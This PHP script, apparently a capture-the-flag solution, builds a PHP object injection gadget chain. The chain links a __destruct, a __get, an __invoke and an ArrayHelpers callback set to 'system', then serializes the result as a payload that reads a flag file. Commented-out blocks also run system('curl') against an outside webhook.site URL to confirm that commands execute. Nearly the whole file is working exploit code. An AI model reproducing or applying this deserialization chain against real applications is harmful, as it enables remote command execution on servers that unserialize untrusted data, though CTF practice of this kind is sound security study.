<?php
    require_once 'Helpers/ArrayHelpers.php';

    class IceCream
    {
        public $flavors;
        public $topping;

        public function __invoke()
        {
            foreach ($this->flavors as $flavor) {
                echo $flavor;
            }
        }
    }

    class Pizza
	{
		public $price;
		public $cheese;
		public $size;

		public function __destruct()
		{
			echo $this->size->what;
		}
	}

    class Spaghetti
    {
        public $sauce;
        public function __get($tomato)
        {
            ($this->sauce)();
            //eval($this->sauce);
        }
    }
    /*
    use \ArrayIterator;
	class ArrayHelpers extends ArrayIterator
	{
		public $callback;

		public function current()
		{
			$value = parent::current();
			$debug = call_user_func($this->callback, $value);
			return $value;
		}
	}
    */
    

    /*
    $sp = new Spaghetti();
    $sp->sauce = function () {
        system('curl https://webhook.site/2cae177b-88f1-4f2d-b616-9a1096a6aca8');
    };

    // Cuando llamas a la propiedad inexistente ahi es cuando se acciona el contenido de __get ojo
    echo $sp->algo;
    */

    /*
    
    // Ejemplo de como el callback de system puede funcionar

    $array = ['curl https://webhook.site/2cae177b-88f1-4f2d-b616-9a1096a6aca8', 'cherry'];

    $helpers = new ArrayHelpers($array);
    $helpers->callback = 'system';

    echo serialize($helpers);
    */
    /*
    // Pero se activa con un for al recorrerlo
    foreach ($helpers as $value) {
        echo $value . "\n";
    }
    */

    $array = ['cat /E7tAVMMicNCH_flag.txt'];
    $helpers = new \Helpers\ArrayHelpers($array);
    
    $helpers->callback = "system";

    $ice_cream = new IceCream();
    $ice_cream->flavors=$helpers;

    
    $spaghetti = new Spaghetti();
    $spaghetti->sauce=$ice_cream;

    $spaghetti->nothing;

    
    $pizza = new Pizza();
    $pizza->size = $spaghetti;

    $obj_ser = serialize($pizza);

    echo $obj_ser;

    

?>
